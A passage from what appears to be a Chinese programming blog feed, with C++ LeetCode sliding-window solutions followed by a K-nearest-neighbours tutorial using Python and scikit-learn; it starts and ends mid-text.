。采摘的水果应当符合篮子中的水果类型。每采摘一次，你将会向右移动到下一棵树，并继续采摘。一旦你走到某棵树前，但水果不符合篮子的水果类型，那么就必须停止采摘。给你一个整数数组 fruits ，返回你可以收集的水果的 最大 数目。 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/fruit-into-baskets著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：fruits = [1,2,1]输出：3解释：可以采摘全部 3 棵树。示例 2：输入：fruits = [0,1,2,2]输出：3解释：可以采摘 [1,2,2] 这三棵树。如果从第一棵树开始采摘，则只能采摘 [0,1] 这两棵树。示例 3：输入：fruits = [1,2,3,2,2]输出：4解释：可以采摘 [2,3,2,2] 这四棵树。如果从第一棵树开始采摘，则只能采摘 [1,2] 这两棵树。示例 4：输入：fruits = [3,3,3,1,2,1,1,2,3,3,4]输出：5解释：可以采摘 [1,2,1,1,2] 这五棵树来源：力扣（LeetCode）链接：https://leetcode.cn/problems/fruit-into-baskets著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解 滑动窗口</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int totalFruit(vector<int>& fruits) &#123;       int slow,fast,length,size,max;       max=slow=fast=size=0;//slow 滑动窗口左边界，fast 滑动窗口右边界,size记录存储的种类数,max表示最大存储的树的个数       length=fruits.size();//fruits 长度       int *array =new int[length]();//初始化长度为length的数组，存储每个种类的个数       while(fast<length)&#123;           if(array[fruits[fast]]==0)//出现新的品种                size++;            array[fruits[fast]]++;//记录每一个品种的个数            while(size>2)&#123;//当出现第3类品种时候                array[fruits[slow]]--;//窗口左边移动，每一个品种数减一                if(array[fruits[slow]]==0)//直到第一类全部清除。                    size--;//品种数减一                slow++;//窗口左边移动            &#125;            max=max>(fast-slow+1)?max:fast-slow+1;//这个是每一次移动都会比较。            fast++;       &#125;    return max;    &#125;&#125;;/*集合判断元素是否存在;country.count("china")删除元素country.erase("china"); //删除“china”无效，因为集合中不存在这样的元素 插入元素country.insert("china");     //&#123;"china"&#125;获取集合元素的个数country.size()*/</code></pre><pre class=" language-c++"><code class="language-c++">还有一个问题是我在c++中初始化数组的方式。int* array = new int[length] ()nt* array = new int[length]有无括号的区别在于，有括号的话会将元素初始化为0，没括号就不会初始化。复杂度分析时间复杂度：O(n)，其中 n 是数组 fruits 的长度。空间复杂度：O(n)，创建一个数组n作者：LeetCode-Solution链接：https://leetcode.cn/problems/fruit-into-baskets/solution/shui-guo-cheng-lan-by-leetcode-solution-1uyu/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</code></pre><h3 id="剑指-Offer-57-II-和为s的连续正数序列"><a href="#剑指-Offer-57-II-和为s的连续正数序列" class="headerlink" title="剑指 Offer 57 - II. 和为s的连续正数序列"></a><a href="https://leetcode.cn/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof/">剑指 Offer 57 - II. 和为s的连续正数序列</a></h3><blockquote><p>题目描述</p></blockquote><pre class=" language-c++"><code class="language-c++">输入一个正整数 target ，输出所有和为 target 的连续正整数序列（至少含有两个数）。序列内的数字由小到大排列，不同序列按照首个数字从小到大排列。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：target = 9输出：[[2,3,4],[4,5]]示例 2：输入：target = 15输出：[[1,2,3,4,5],[4,5,6],[7,8]]来源：力扣（LeetCode）链接：https://leetcode.cn/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解 滑动窗口</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<vector<int>> findContinuousSequence(int target) &#123;        vector<vector<int>>res;        vector<int>ans;        int slow,fast,length,sum;//sum 计算fast求和的值        slow=fast=1;//fast，slow滑动窗口左右两边        length=target/2+1;//遍历只需要到中间值，因为要连续，两个        sum=0;//计算每一次fast移动的值        while(fast<target)&#123;            sum+=fast;            while(sum>=target)&#123;// 如果sum值大于等于target值，移动窗口左边界。                if(sum==target)&#123;//如果当前值等于target值，就要加入vector                    for(int j=slow;j<=fast;j++)                        ans.push_back(j);                    res.push_back(ans);                    ans.clear();                    break;                &#125;                else if(sum> target)&#123;//继续移动左边界                    sum=sum-slow;                    slow++;                &#125;                else //sum<  target 则停止遍历                    break;            &#125;            fast++;        &#125;        return res;    &#125;&#125;;</code></pre><h3 id="643-子数组最大平均数-I：固定窗口"><a href="#643-子数组最大平均数-I：固定窗口" class="headerlink" title="643. 子数组最大平均数 I：固定窗口"></a><a href="https://leetcode.cn/problems/maximum-average-subarray-i/">643. 子数组最大平均数 I</a>：固定窗口</h3><blockquote><p>题目描述</p></blockquote><pre class=" language-c++"><code class="language-c++">给你一个由 n 个元素组成的整数数组 nums 和一个整数 k 。请你找出平均数最大且 长度为 k 的连续子数组，并输出该最大平均数。任何误差小于 10-5 的答案都将被视为正确答来源：力扣（LeetCode）链接：https://leetcode.cn/problems/maximum-average-subarray-i著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：nums = [1,12,-5,-6,50,3], k = 4输出：12.75解释：最大平均数 (12-5-6+50)/4 = 51/4 = 12.75示例 2：输入：nums = [5], k = 1输出：5.00000 提示：n == nums.length1 <= k <= n <= 105-104 <= nums[i] <= 104来源：力扣（LeetCode）链接：https://leetcode.cn/problems/maximum-average-subarray-i著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解一 一层循环</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    double findMaxAverage(vector<int>& nums, int k) &#123;        int slow,fast;//定义滑动窗口 左右边界        int length=nums.size();//数组长度        slow=fast=0;//初始化 快慢指针        double sum;//avg 为平均值，sum为滑动窗口中的求和        double avg;                      sum=0;        avg=-1000000;        for(;fast<length;fast++)&#123;            sum+=nums[fast];           // cout<<sum<<endl;            if((fast-slow+1)==k)&#123;//                avg=avg>sum? avg:sum;                sum-=nums[slow];                slow++;            &#125;        &#125;        return avg/k;    &#125;&#125;</code></pre><pre class=" language-c++"><code class="language-c++">- 时间复杂度：O(n)，其中 n 是数组 nums 的长度。遍历数组一次。- 空间复杂度：O(1)。</code></pre><blockquote><p>题解二 二层循环</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    double findMaxAverage(vector<int>& nums, int k) &#123;        int slow,fast;//定义滑动窗口 左右边界        int length=nums.size();//数组长度        slow=fast=0;//初始化 快慢指针        double sum;//avg 为平均值，sum为滑动窗口中的求和        double avg;                      sum=0;        avg=-1000000;        for(;fast<length;fast++)&#123;            sum+=nums[fast];           // cout<<sum<<endl;            while((fast-slow+1)>=k)&#123;                if((fast-slow+1)==k)                    avg=avg>sum? avg:sum;                sum-=nums[slow];                slow++;            &#125;        &#125;        return avg/k;    &#125;&#125;;</code></pre><h3 id="offer57-和643题解总结-固定窗口"><a href="#offer57-和643题解总结-固定窗口" class="headerlink" title="offer57 和643题解总结:固定窗口"></a>offer57 和643题解总结:固定窗口</h3><pre class=" language-c++"><code class="language-c++">相同点：都可以简化为1层循环        时间复杂度都一样。</code></pre><h3 id="1984-学生分数的最小差值-固定窗口"><a href="#1984-学生分数的最小差值-固定窗口" class="headerlink" title="1984. 学生分数的最小差值:固定窗口"></a><a href="https://leetcode.cn/problems/minimum-difference-between-highest-and-lowest-of-k-scores/">1984. 学生分数的最小差值</a>:固定窗口</h3><blockquote><p>题目描述</p></blockquote><pre class=" language-c++"><code class="language-c++">给你一个 下标从 0 开始 的整数数组 nums ，其中 nums[i] 表示第 i 名学生的分数。另给你一个整数 k 。从数组中选出任意 k 名学生的分数，使这 k 个分数间 最高分 和 最低分 的 差值 达到 最小化 。返回可能的 最小差值 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/minimum-difference-between-highest-and-lowest-of-k-scores著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：nums = [90], k = 1输出：0解释：选出 1 名学生的分数，仅有 1 种方法：- [90] 最高分和最低分之间的差值是 90 - 90 = 0可能的最小差值是 0示例 2：输入：nums = [9,4,1,7], k = 2输出：2解释：选出 2 名学生的分数，有 6 种方法：- [9,4,1,7] 最高分和最低分之间的差值是 9 - 4 = 5- [9,4,1,7] 最高分和最低分之间的差值是 9 - 1 = 8- [9,4,1,7] 最高分和最低分之间的差值是 9 - 7 = 2- [9,4,1,7] 最高分和最低分之间的差值是 4 - 1 = 3- [9,4,1,7] 最高分和最低分之间的差值是 7 - 4 = 3- [9,4,1,7] 最高分和最低分之间的差值是 7 - 1 = 6可能的最小差值是 2 提示：1 <= k <= nums.length <= 10000 <= nums[i] <= 105通过次数43,048提交次数69,1来源：力扣（LeetCode）链接：https://leetcode.cn/problems/minimum-difference-between-highest-and-lowest-of-k-scores著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解（先排序再滑动窗口）</p></blockquote><pre class=" language-c++"><code class="language-c++">怎么寻找 k 个数字的最大值和最小值的差呢？这让我们想到，对数组进行排序，然后利用大小为 k 的滑动窗口遍历整个数组。滑动窗口最右边的值就是窗口内的最大值，滑动窗口最左边的值就是窗口内的最小值。​因此，我们要寻找的就是已经排序的数组中，所有大小为 k 的滑动窗口中，最右端数字 - 最左端数字 的最小结果</code></pre><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int minimumDifference(vector<int>& nums, int k) &#123;        int n = nums.size();//计算数组长度        sort(nums.begin(), nums.end());//对数组进行排序        int ans = INT_MAX;//ans 作为最小差值 初始化为INT_MAX;        for(int i=k-1;i<n;i++)&#123;//维持一个窗口大小为k。            ans=min(ans,nums[i]-nums[i-k+1]);//选择最小        &#125;        return ans;    &#125;&#125;;</code></pre><pre class=" language-c++"><code class="language-c++">时间复杂度分析：空间复杂度为排序时所需要的临时数组0(n).时间复杂度为排序时所需要的0（nlogn）</code></pre><h3 id="2269-找到一个数字的-K-美丽值-固定窗口"><a href="#2269-找到一个数字的-K-美丽值-固定窗口" class="headerlink" title="2269. 找到一个数字的 K 美丽值:固定窗口"></a><a href="https://leetcode.cn/problems/find-the-k-beauty-of-a-number/">2269. 找到一个数字的 K 美丽值</a>:固定窗口</h3><blockquote><p>题目描述</p></blockquote><pre class=" language-c++"><code class="language-c++">一个整数 num 的 k 美丽值定义为 num 中符合以下条件的 子字符串 数目：子字符串长度为 k 。子字符串能整除 num 。给你整数 num 和 k ，请你返回 num 的 k 美丽值。注意：允许有 前缀 0 。0 不能整除任何值。一个 子字符串 是一个字符串里的连续来源：力扣（LeetCode）链接：https://leetcode.cn/problems/find-the-k-beauty-of-a-number著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：num = 240, k = 2输出：2解释：以下是 num 里长度为 k 的子字符串：- "240" 中的 "24" ：24 能整除 240 。- "240" 中的 "40" ：40 能整除 240 。所以，k 美丽值为 2 。示例 2：输入：num = 430043, k = 2输出：2解释：以下是 num 里长度为 k 的子字符串：- "430043" 中的 "43" ：43 能整除 430043 。- "430043" 中的 "30" ：30 不能整除 430043 。- "430043" 中的 "00" ：0 不能整除 430043 。- "430043" 中的 "04" ：4 不能整除 430043 。- "430043" 中的 "43" ：43 能整除 430043 。所以，k 美丽值为 2 。来源：力扣（LeetCode）链接：https://leetcode.cn/problems/find-the-k-beauty-of-a-number著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int divisorSubstrings(int num, int k) &#123;        string n=to_string(num);        int slow, fast,length;        length=n.size();        slow=fast=0;        int sum=0;        int count=0;        for(fast=0;fast<length;fast++)&#123;            sum=sum*10+n[fast]-'0'; //n[fast]-'0'转换成int            if((fast-slow+1)==k)&#123;//固定窗口                if(sum!=0&& num%sum==0)                           count++;               sum=sum-(int)(n[slow]-'0')*pow(10,k-1);//sum-slow操作                slow++;            &#125;        &#125;        return count;    &#125;&#125;;</code></pre><h3 id="1984和2269-总结：固定窗口"><a href="#1984和2269-总结：固定窗口" class="headerlink" title="1984和2269 总结：固定窗口"></a>1984和2269 总结：固定窗口</h3><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int divisorSubstrings(int num, int k) &#123;  固定窗口大小k        string n=to_string(num);        int slow,fast,length;        length=n.size();        slow=fast=0;        int i=0;        int sum=0;        int count=0;                for(fast=0;fast<length;fast++)&#123;            sum和n[fast]和关系            if((fast-slow+1)==k)&#123;//达到固定窗口                        满足题目中条件最主要的逻辑               sum和n[slow]的差关系               slow++;            &#125;        &#125;                return count;    &#125;&#125;;</code></pre><h2 id="leetcode-滑动窗口推荐"><a href="#leetcode-滑动窗口推荐" class="headerlink" title="leetcode 滑动窗口推荐"></a>leetcode 滑动窗口推荐</h2><p><a href="https://github.com/SharingSource/LogicStack-LeetCode/wiki/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3">滑动窗口 · SharingSource/LogicStack-LeetCode Wiki · GitHub</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>参考链接：<a href="https://leetcode.cn/problems/minimum-size-subarray-sum/solution/by-ac_oier-c5jm/">【宫水三叶】前缀和 + 二分 运用题 - 长度最小的子数组 - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/problems/minimum-size-subarray-sum/solution/chang-du-zui-xiao-de-zi-shu-zu-by-leetcode-solutio/">长度最小的子数组 - 长度最小的子数组 - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/problems/fruit-into-baskets/solution/zhua-wa-mou-si-by-muse-77-bkd2/">【爪哇缪斯】图解LeetCode - 水果成篮 - 力扣（LeetCode）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K近邻法:KNN</title>
      <link href="/2022/10/20/KNN/"/>
      <url>/2022/10/20/KNN/</url>
      
        <content type="html"><![CDATA[<h1 id="K近邻法-（KNN）"><a href="#K近邻法-（KNN）" class="headerlink" title="K近邻法 （KNN）"></a>K近邻法 （KNN）</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>K近邻（K-Nearest Neighbor, KNN）是一种最经典和最简单的<em>有监督学习</em>方法之一，K-近邻算法是最简单的分类器。</p><p><strong>K近邻算法既能够用来解决分类问题，也能够用来解决回归问题</strong>。当对<strong>数据的分布只有很少</strong>或者<strong>没有任何先验知识</strong>时，<strong>K 近邻算法是一个不错的选择</strong>。</p><p>KNN做<strong>分类预测</strong>时，一般是选择<strong>多数表决法</strong>，即训练集里和预测的样本特征最近的K个样本，预测为里面有最多类别数的类别。<br>KNN做<strong>回归</strong>时，一般是<strong>选择平均法</strong>，即最近的K个样本的样本输出的平均值作为回归预测值</p><h2 id="2-算法思想"><a href="#2-算法思想" class="headerlink" title="2.算法思想"></a>2.算法思想</h2><p><strong>「人以群分，物语类聚」、「近朱者赤，近墨者黑」是 KNN 的核心思想</strong>。</p><p><strong>KNN 中的K指的是近邻个数，也就是最近的K个点，根据它距离最近的K个点是什么类别来判断属于哪个类别。根据待分类样本周围的已知类别样本来判断待分类样本的类别</strong>。</p><p>简单说 如果你周围都是猴子，那 kNN 就认为你是猴子， 如果你周围都是大学生，那 kNN 就认为你是大学生。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/74b33246feb16cbdffab526b461703e3.gif" alt="KNN 最近邻算法"></p><h2 id="3-距离度量方法"><a href="#3-距离度量方法" class="headerlink" title="3.距离度量方法"></a>3.距离度量方法</h2><h3 id="1-欧氏距离"><a href="#1-欧氏距离" class="headerlink" title="1.欧氏距离"></a>1.欧氏距离</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020180858.png" alt="image-20221020180858668"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020170718.png" alt="2FDEB4F409732F92F83F48422D76A5DC"></p><blockquote><p>注意点</p></blockquote><p>当维度之间的<strong>取值范围差别太大时</strong>，<strong>欧氏距离容易被那些取值范围大的变量所主导</strong>，从而会大大降低模型的效果。</p><p>因此，在实际应用<strong>K近邻算法来解决分类</strong>等问题时，如果<strong>采用欧氏距离作为相似度度量</strong>，<strong>最好提前对数据进行标准化转换</strong></p><p>即：<code>数据归一化</code>。</p><h3 id="2-曼哈顿距离"><a href="#2-曼哈顿距离" class="headerlink" title="2.曼哈顿距离"></a>2.曼哈顿距离</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020180842.png" alt="image-20221020180842136"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020170742.png" alt="896FCAFD0421B752CAF19C6C0EE76684"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020174350.jpg" alt="23"></p><p><strong>红线代表曼哈顿距离，绿色代表欧氏距离，也就是直线距离，而蓝色和黄色代表等价的曼哈顿距离</strong></p><h2 id="4-KNN-算法步骤"><a href="#4-KNN-算法步骤" class="headerlink" title="4.KNN 算法步骤"></a>4.KNN 算法步骤</h2><ol><li> <strong>计算测试数据与各个样本数据之间的距离，通常为欧式距离；</strong></li><li> <strong>按照距离的递增关系进行排序；</strong></li><li> <strong>选取距离最小的K个点；（K值的选择往往会对最终结果造成很大影响）</strong></li><li> <strong>确定前K个点所在类别的出现频率；</strong></li><li> <strong>返回前K个点中出现频率最高的类别作为测试数据的预测分类（投票法规则：少数服从多数）。</strong></li></ol><p><img src="https://img-blog.csdnimg.cn/img_convert/74b33246feb16cbdffab526b461703e3.gif" alt="KNN 最近邻算法"></p><blockquote><p>注意事项</p></blockquote><p><strong><code>计算数据距离之前别忘了进行归一化处理</code></strong></p><h2 id="5-KNN-算法分析"><a href="#5-KNN-算法分析" class="headerlink" title="5.KNN 算法分析"></a>5.KNN 算法分析</h2><p><strong>近似误差</strong>：可以理解为对现有<strong>训练集的训练误差</strong>。<br><strong>估计误差</strong>：可以理解为对<strong>测试集的测试误差</strong>。</p><p><strong>近似误差关注训练集</strong>，如果<strong>近似误差小</strong>了会<strong>出现过拟合的现象</strong>，对现有的<strong>训练集</strong>能有很<strong>好的预测</strong>，但是对<strong>未知的测试样本</strong>将会出现<strong>较大偏差</strong>的预测。</p><p>模型本身不是最接近最佳模型。</p><p><strong>估计误差关注测试集</strong>，<strong>估计误差小</strong>了说明<strong>对未知数据的预测能力好</strong>。<strong>模型本身最接近最佳模型</strong></p><h3 id="1-k值的影响"><a href="#1-k值的影响" class="headerlink" title="1. k值的影响"></a>1. k值的影响</h3><blockquote><p>k值取值较小</p></blockquote><p><strong>k值较小，相当于用较小的邻域中的训练实例进行预测，只有<code>距离近的（相似的）起作用</code></strong></p><ul><li><strong>单个样本影响大</strong></li><li><strong>“学习”的近似误差(approximation error)会减小（训练误差），但估计误差(estimation error)会增大（预测误差）</strong></li><li><strong>噪声敏感（对一些噪点数据敏感）</strong></li><li><strong>整体模型变得复杂，容易发生过拟合</strong></li></ul><blockquote><p>k值取值较大</p></blockquote><p><strong>k值较大，这时<code>距离远的（不相似的）也会起作用</code></strong></p><ul><li><strong>近似误差会增大，但估计误差会减小</strong></li><li><strong>整体的模型变得简单</strong></li></ul><blockquote><p>k值的选择</p></blockquote><p><strong>交叉验证</strong>选择最好的k值</p><p>留一交叉验证是一种详尽的交叉验证技术，其中 1 个样本点用作验证集，其余 n-1 个样本用作训练集。</p><p>假设我们在数据集中有 100 个样本。然后在每次迭代中，1 个值将用作验证集，其余 99 个样本作为训练集。因此，重复该过程，直到数据集的每个样本都用作验证点。</p><p>参考链接：<a href="https://www.cnblogs.com/BlairGrowing/p/15668898.html">七种交叉验证及其代码 - 视界~ - 博客园 (cnblogs.com)</a></p><blockquote><p>参考链接</p></blockquote><p><strong>k值选择的影响</strong></p><p><strong>参考链接：<a href="https://blog.csdn.net/lihao19990930/article/details/115678336?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-115678336-blog-115061208.pc_relevant_multi_platform_whitelistv3&spm=1001.2101.3001.4242.2&utm_relevant_index=4">(19条消息) KNN(K-Nearest Neighbor)简介_弱鸡萌新的博客-CSDN博客_knn简介</a></strong></p><h3 id="2-优点和缺点"><a href="#2-优点和缺点" class="headerlink" title="2.优点和缺点"></a>2.优点和缺点</h3><p><strong>优点：原理易懂，代码容易复现，预测效果好</strong>。</p><p><strong>缺点：</strong></p><ul><li><strong>计算量太大</strong>，尤其是<strong>特征数非常多</strong>的时候。每一个待分类文本都要计算<strong>它到全体已知样本的距离</strong>，才能得到它的K个最近邻点。</li><li><strong>样本不平衡</strong>的时候，<strong>对稀有类别的预测准确率低</strong>。当样本不平衡时，如一个类的样本容量很大，而其他类样本容量很小时，有可能导致当输入一个新样本时，该样本的K个邻居中大容量类的样本占多数。</li></ul><h2 id="6-KNN-代码"><a href="#6-KNN-代码" class="headerlink" title="6.KNN 代码"></a>6.KNN 代码</h2><blockquote><p>1.生成训练数据集</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>datasets <span class="token keyword">import</span> make_blobs<span class="token comment" spellcheck="true"># 生成数据</span><span class="token triple-quoted-string string">"""代码中，生成60个训练样本，这60个样本分布在以centers参数指定中心点周围。cluster_std是标准差，用来指明生成的点分布的松散程度。生成的训练数据集放在变量X里面，数据集的类别标记放在y里面。make_blobs函数是为聚类产生数据集产生一个数据集和相应的标签n_samples:表示数据样本点个数,默认值100n_features:表示数据的维度，默认值是2centers:产生数据的中心点，默认值3cluster_std：数据集的标准差，浮点数或者浮点数序列，默认值1.0center_box：中心确定之后的数据边界，默认值(-10.0, 10.0)shuffle ：洗乱，默认值是Truerandom_state:官网解释是随机生成器的种子"""</span>centers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span>X<span class="token punctuation">,</span> y <span class="token operator">=</span> make_blobs<span class="token punctuation">(</span>n_samples<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>centers<span class="token operator">=</span>centers<span class="token punctuation">,</span>random_state<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> cluster_std<span class="token operator">=</span><span class="token number">0.60</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""这些点的分布情况在坐标轴上一目了然，其中三角形的点即各个类别的中心节点。"""</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npplt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dpi<span class="token operator">=</span><span class="token number">144</span><span class="token punctuation">)</span>c <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>centers<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 画出样本</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> X<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token operator">=</span>y<span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">'cool'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 画出中心点</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'^'</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'orange'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span><span class="token string">'knn_centers.png'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020174807.png" alt="5"></p><blockquote><p>2.交叉验证选择k</p></blockquote><pre class=" language-SS"><code class="language-SS">k_range = range(1, 30) # 设置循环次数k_error = []#循环，取k从1~30，查看误差效果for k in k_range:    knn = KNeighborsClassifier(n_neighbors=k)    #cv参数决定数据集划分比例，这里是按照5:1划分训练集和测试集    scores = cross_val_score(knn, X, y, cv=6, scoring='accuracy')    k_error.append(1 - scores.mean())#画图，x轴为k值，y值为误差值plt.plot(k_range, k_error)plt.xlabel('Value of K in KNN')plt.ylabel('Error')plt.show()</code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020180012.png" alt="image-20221020180012218"></p><blockquote><p>3.训练knn</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 使用KNeighborsClassifier对算法进行训练，我们选择参数k=5</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>neighbors <span class="token keyword">import</span> KNeighborsClassifier<span class="token comment" spellcheck="true"># 模型训练</span>k <span class="token operator">=</span> <span class="token number">10</span>clf <span class="token operator">=</span> KNeighborsClassifier<span class="token punctuation">(</span>n_neighbors <span class="token operator">=</span> k<span class="token punctuation">)</span>clf<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>X<span class="token punctuation">,</span> y<span class="token punctuation">)</span></code></pre><blockquote><p>4.模型测试</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 对一个新样本进行预测：</span><span class="token comment" spellcheck="true"># 进行预测</span><span class="token triple-quoted-string string">"""我们要预测的样本是[0, 2]，使用kneighbors()方法，把这个样本周围距离最*的5个点取出来。取出来的点是训练样本X里的索引，从0开始计算。"""</span>X_sample <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y_sample <span class="token operator">=</span> clf<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>X_sample<span class="token punctuation">)</span>neighbors <span class="token operator">=</span> clf<span class="token punctuation">.</span>kneighbors<span class="token punctuation">(</span>X_sample<span class="token punctuation">,</span> return_distance<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><blockquote><p>5.画出最邻近的k个点</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 把待预测的样本以及和其最*的10个样本在图上标记出来。</span><span class="token comment" spellcheck="true"># 画出示意图</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dpi<span class="token operator">=</span><span class="token number">144</span><span class="token punctuation">)</span>c <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>centers<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> X<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token operator">=</span>y<span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">'cool'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 出样本</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'^'</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'k'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 中心点</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X_sample<span class="token 